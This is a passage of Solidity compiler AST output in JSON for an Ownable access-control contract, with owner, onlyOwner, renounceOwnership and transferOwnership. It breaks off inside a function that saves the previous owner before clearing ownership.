										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 9,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "246:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 8,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "246:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "245:6:0"
									},
									"scope": 12,
									"src": "202:50:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 588,
							"src": "176:79:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 151,
							"linearizedBaseContracts": [
								151
							],
							"name": "Ownable",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 14,
									"name": "_owner",
									"nodeType": "VariableDeclaration",
									"scope": 151,
									"src": "283:21:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 13,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "283:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 16,
									"name": "_previousOwner",
									"nodeType": "VariableDeclaration",
									"scope": 151,
									"src": "311:29:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 15,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "311:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 22,
									"name": "OwnershipTransferred",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 21,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"indexed": true,
												"name": "previousOwner",
												"nodeType": "VariableDeclaration",
												"scope": 22,
												"src": "386:29:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 17,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "386:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 20,
												"indexed": true,
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"scope": 22,
												"src": "426:24:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 19,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "426:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "375:82:0"
									},
									"src": "349:109:0"
								},
								{
									"body": {
										"id": 41,
										"nodeType": "Block",
										"src": "588:137:0",
										"statements": [
											{
												"assignments": [
													26
												],
												"declarations": [
													{
														"constant": false,
														"id": 26,
														"name": "msgSender",
														"nodeType": "VariableDeclaration",
														"scope": 41,
														"src": "599:17:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 25,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "599:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 29,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 27,
														"name": "msg",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1241,
														"src": "619:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_magic_message",
															"typeString": "msg"
														}
													},
													"id": 28,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "sender",
													"nodeType": "MemberAccess",
													"referencedDeclaration": null,
													"src": "619:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "599:30:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 32,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 30,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "640:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 31,
														"name": "msgSender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 26,
														"src": "649:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "640:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 33,
												"nodeType": "ExpressionStatement",
												"src": "640:18:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 36,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "703:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 35,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "695:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 37,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "695:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 38,
															"name": "msgSender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 26,
															"src": "707:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 34,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "674:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 39,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "674:43:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 40,
												"nodeType": "EmitStatement",
												"src": "669:48:0"
											}
										]
									},
									"documentation": "@dev Initializes the contract setting the deployer as the initial owner.",
									"id": 42,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "576:2:0"
									},
									"returnParameters": {
										"id": 24,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "588:0:0"
									},
									"scope": 151,
									"src": "565:160:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 49,
										"nodeType": "Block",
										"src": "853:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 47,
													"name": "_owner",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 14,
													"src": "871:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 46,
												"id": 48,
												"nodeType": "Return",
												"src": "864:13:0"
											}
										]
									},
									"documentation": "@dev Returns the address of the current owner.",
									"id": 50,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "owner",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "820:2:0"
									},
									"returnParameters": {
										"id": 46,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 45,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "844:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 44,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "844:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "843:9:0"
									},
									"scope": 151,
									"src": "806:79:0",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 61,
										"nodeType": "Block",
										"src": "999:96:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 53,
																"name": "_owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 14,
																"src": "1018:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 54,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1241,
																	"src": "1028:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 55,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1028:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "1018:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572",
															"id": 57,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1040:34:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9924ebdf1add33d25d4ef888e16131f0a5687b0580a36c21b5c301a6c462effe",
																"typeString": "literal_string \"Ownable: caller is not the owner\""
															},
															"value": "Ownable: caller is not the owner"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9924ebdf1add33d25d4ef888e16131f0a5687b0580a36c21b5c301a6c462effe",
																"typeString": "literal_string \"Ownable: caller is not the owner\""
															}
														],
														"id": 52,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "1010:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 58,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1010:65:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 59,
												"nodeType": "ExpressionStatement",
												"src": "1010:65:0"
											},
											{
												"id": 60,
												"nodeType": "PlaceholderStatement",
												"src": "1086:1:0"
											}
										]
									},
									"documentation": "@dev Throws if called by any account other than the owner.",
									"id": 62,
									"name": "onlyOwner",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 51,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "996:2:0"
									},
									"src": "978:117:0",
									"visibility": "internal"
								},
								{
									"body": {
										"id": 80,
										"nodeType": "Block",
										"src": "1492:94:0",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 68,
															"name": "_owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 14,
															"src": "1529:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 70,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1545:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 69,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1537:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 71,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1537:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 67,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "1508:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 72,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1508:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 73,
												"nodeType": "EmitStatement",
												"src": "1503:45:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 78,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 74,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "1559:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 76,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1576:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																}
															],
															"id": 75,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "1568:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": "address"
														},
														"id": 77,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1568:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "1559:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 79,
												"nodeType": "ExpressionStatement",
												"src": "1559:19:0"
											}
										]
									},
									"documentation": "@dev Leaves the contract without owner. It will not be possible to call\n`onlyOwner` functions anymore. Can only be called by the current owner.\n\n     * NOTE: Renouncing ownership will leave the contract without an owner,\nthereby removing any functionality that is only available to the owner.",
									"id": 81,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 65,
											"modifierName": {
												"argumentTypes": null,
												"id": 64,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 62,
												"src": "1482:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "1482:9:0"
										}
									],
									"name": "renounceOwnership",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 63,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1472:2:0"
									},
									"returnParameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1492:0:0"
									},
									"scope": 151,
									"src": "1446:140:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 106,
										"nodeType": "Block",
										"src": "1803:213:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 93,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 89,
																"name": "newOwner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 83,
																"src": "1836:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 91,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1856:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 90,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1848:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 92,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1848:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "1836:22:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061646472657373",
															"id": 94,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1873:40:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_245f15ff17f551913a7a18385165551503906a406f905ac1c2437281a7cd0cfe",
																"typeString": "literal_string \"Ownable: new owner is the zero address\""
															},
															"value": "Ownable: new owner is the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_245f15ff17f551913a7a18385165551503906a406f905ac1c2437281a7cd0cfe",
																"typeString": "literal_string \"Ownable: new owner is the zero address\""
															}
														],
														"id": 88,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "1814:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 95,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1814:110:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 96,
												"nodeType": "ExpressionStatement",
												"src": "1814:110:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 98,
															"name": "_owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 14,
															"src": "1963:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 99,
															"name": "newOwner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 83,
															"src": "1971:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 97,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 22,
														"src": "1942:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 100,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1942:38:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 101,
												"nodeType": "EmitStatement",
												"src": "1937:43:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 104,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 102,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "1991:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 103,
														"name": "newOwner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 83,
														"src": "2000:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "1991:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 105,
												"nodeType": "ExpressionStatement",
												"src": "1991:17:0"
											}
										]
									},
									"documentation": "@dev Transfers ownership of the contract to a new account (`newOwner`).\nCan only be called by the current owner.",
									"id": 107,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 86,
											"modifierName": {
												"argumentTypes": null,
												"id": 85,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 62,
												"src": "1793:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "1793:9:0"
										}
									],
									"name": "transferOwnership",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 84,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 83,
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"scope": 107,
												"src": "1768:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 82,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1768:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1767:18:0"
									},
									"returnParameters": {
										"id": 87,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1803:0:0"
									},
									"scope": 151,
									"src": "1741:275:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 129,
										"nodeType": "Block",
										"src": "2125:128:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 112,
														"name": "_previousOwner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 16,
														"src": "2136:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 113,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "2153:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "2136:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 115,
												"nodeType": "ExpressionStatement",
												"src": "2136:23:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 120,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 116,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 14,
														"src": "2170:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 118,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2187:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																}
															],
															"id": 117,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2179:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": "address"
														},
														"id": 119,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2179:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "2170:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 121,
												"nodeType": "ExpressionStatement",
												"src": "2170:19:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 123,
															"name": "_owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 14,
															"src": "2226:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
